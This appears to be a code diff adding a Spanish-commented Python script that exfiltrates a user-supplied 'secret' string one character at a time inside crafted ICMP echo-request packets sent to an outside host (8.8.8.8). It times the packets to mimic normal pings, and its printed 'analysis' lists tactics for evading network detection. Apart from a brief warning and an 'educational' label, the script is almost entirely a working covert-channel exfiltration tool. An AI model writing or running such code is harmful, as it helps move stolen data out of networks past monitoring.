@@ -1,0 +1,107 @@
+import socket
+import struct
+import time
+import os
+import random
+from scapy.all import IP, ICMP, send
+
+def generate_icmp_packet(data):
+    """Genera un paquete ICMP request con los datos especificados."""
+    icmp_type = 8  # Tipo 8 para ICMP Echo Request
+    icmp_code = 0
+    icmp_checksum = 0
+    icmp_id = random.randint(1, 65535)
+    icmp_seq = 1
+
+    # Empaquetar la cabecera ICMP
+    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+
+    # Calcular el checksum (función auxiliar)
+    def checksum(data):
+        s = 0
+        n = len(data) % 2
+        for i in range(0, len(data) - n, 2):
+            s += data[i] + (data[i+1] << 8)
+        if n:
+            s += data[len(data) - 1]
+        while (s >> 16):
+            s = (s & 0xFFFF) + (s >> 16)
+        s = ~s & 0xFFFF
+        return s
+
+    icmp_checksum = checksum(icmp_header + data.encode())
+    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_seq)
+
+    return icmp_header + data.encode()
+
+def send_stealth_icmp(destination_ip, data_string):
+    """Envía la cadena de datos carácter por carácter en paquetes ICMP."""
+    print(f"\nEnviando datos sigilosamente a {destination_ip}:")
+    for char in data_string:
+        packet = generate_icmp_packet(char)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            sock.sendto(packet, (destination_ip, 1))  # El puerto no importa para ICMP
+            print(f"Enviado: '{char}'")
+            time.sleep(0.1)  # Pequeña pausa para simular tráfico normal
+        except socket.error as e:
+            print(f"Error al enviar '{char}': {e}")
+        finally:
+            if 'sock' in locals():
+                sock.close()
+    print("Envío sigiloso completado.")
+
+def capture_ping_details(destination_ip, count=1):
+    """Captura los detalles de un ping real usando scapy."""
+    print(f"\nCapturando detalles de un ping real a {destination_ip}:")
+    os.system(f"ping -c {count} {destination_ip}")
+
+def demonstrate_stealth(destination_ip, data_to_exfiltrate):
+    """Demuestra el envío sigiloso de datos comparando el tráfico."""
+
+    print("\n--- Demostración de Tráfico Sigiloso ICMP ---")
+
+    # Paso 1: Mostrar un ping real previo
+    capture_ping_details(destination_ip)
+
+    # Paso 2: Enviar los datos de forma sigilosa
+    send_stealth_icmp(destination_ip, data_to_exfiltrate)
+
+    # Paso 3: Mostrar un ping real posterior
+    capture_ping_details(destination_ip)
+
+    print("\n--- Análisis ---")
+    print("El tráfico ICMP generado para la exfiltración de datos consiste en múltiples paquetes ICMP Echo Request.")
+    print("Cada paquete contiene un único carácter de la cadena en su campo de datos.")
+    print("Al enviar un carácter por paquete y con pequeñas pausas, se busca imitar un tráfico ICMP más 'natural' y evitar patrones sospechosos como paquetes ICMP grandes o ráfagas rápidas.")
+    print("La comparación con los pings reales (previo y posterior) debería mostrar que el tráfico generado es similar en su naturaleza (paquetes ICMP Echo Request) aunque diferenciándose en la cantidad y el contenido del campo de datos.")
+    print("Para un análisis más profundo y la confirmación de que el tráfico pasa desapercibido, se requeriría una inspección de red a nivel de captura de paquetes (ej: Wireshark) para verificar la ausencia de alarmas o patrones anómalos.")
+    print("Aspectos considerados para pasar desapercibido:")
+    print("- Utilización del tipo y código estándar de ICMP Echo Request (Tipo 8, Código 0).")
+    print("- Enviar un solo carácter por paquete, manteniendo el tamaño de los paquetes pequeño.")
+    print("- Introducir pequeñas pausas entre envíos para evitar ráfagas.")
+    print("- Utilización de un ID y número de secuencia ICMP (aunque simplificado aquí, en implementaciones más avanzadas se podrían variar más).")
+
+if __name__ == "__main__":
+    target_ip = "8.8.8.8"  # Dirección IP de Google
+    secret_data = input("Ingrese la cadena de datos a enviar sigilosamente a Google: ")
+
+    # Verificar si scapy está instalado
+    try:
+        from scapy.all import IP, ICMP, send
+    except ImportError:
+        print("\nError: La librería scapy no está instalada.")
+        print("Por favor, instálala con: pip install scapy")
+        exit()
+
+    # Advertencia importante
+    print("\n¡ADVERTENCIA!")
+    print("Estás a punto de enviar tráfico ICMP personalizado a la dirección IP de Google (8.8.8.8).")
+    print("Esto podría ser interpretado como actividad maliciosa por los sistemas de seguridad de Google o tu proveedor de internet.")
+    print("Realiza esta acción bajo tu propia responsabilidad y solo con fines educativos y de prueba.")
+    confirmacion = input("¿Estás seguro de continuar? (s/n): ").lower()
+    if confirmacion == 's':
+        # Ejecutar la demostración
+        demonstrate_stealth(target_ip, secret_data)
+    else:
+        print("Operación cancelada.")
